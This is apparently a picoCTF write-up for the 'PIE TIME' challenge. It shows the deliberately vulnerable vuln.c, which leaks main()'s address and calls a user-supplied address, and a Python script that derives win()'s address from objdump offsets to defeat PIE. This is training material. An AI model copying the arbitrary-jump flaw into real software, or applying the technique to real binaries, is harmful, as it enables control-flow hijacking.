# PIE TIME Challenge

## Challenge Description
```
Can you try to get the flag? Beware we have PIE!
Additional details will be available after launching your challenge instance.

Hint: Can you figure out what changed between the address you found locally and in the server output?
```

Challenge Link: https://play.picoctf.org/practice/challenge/490

## Solution

Given vuln.c file and the binary of the file

```
┌──(hahmed㉿kali)-[~/Downloads]
└─$ cat vuln.c    
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  printf("Address of main: %p\n", &main);

  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```

### 1. Understand what the program is doing 
The program prints the address of main(), which leaks an address inside the binary. It can be exploited by redirecting execution to the win() function by supplying its address.

### 2. Calculate the win_address.
  #### Get the win() and main() offset
  ```
  objdump -d vuln | grep -E "win|main"
  ```
  
  ![Screenshot 2025-03-15 232233](https://github.com/user-attachments/assets/fe906c03-8bfa-42c2-bfce-4bc5dd1ae72a)
  
  
  #### Use python script to calculate. Enter leaked main address given in the running instance into the script.
     
  ```
  # Offsets from objdump
  win_offset = 0x12a7
  main_offset = 0x133d
  
  # Replace with the actual leaked address of main()
  leaked_main = int(input("Enter leaked main address (hex): "), 16)
  
  # Calculate win()'s address
  win_addr = leaked_main + (win_offset - main_offset)
  
  print(f"Calculated win() address: {hex(win_addr)}")
  ```
  ![Screenshot 2025-03-15 232621](https://github.com/user-attachments/assets/3a634634-87b6-47aa-9488-f602da8bc71c)
   

### 3. Put the calculated win() address into the running instance of the program. This will get the flag.
![Screenshot 2025-03-15 232707](https://github.com/user-attachments/assets/0a960772-844b-4467-8046-b2306ff29bb8)


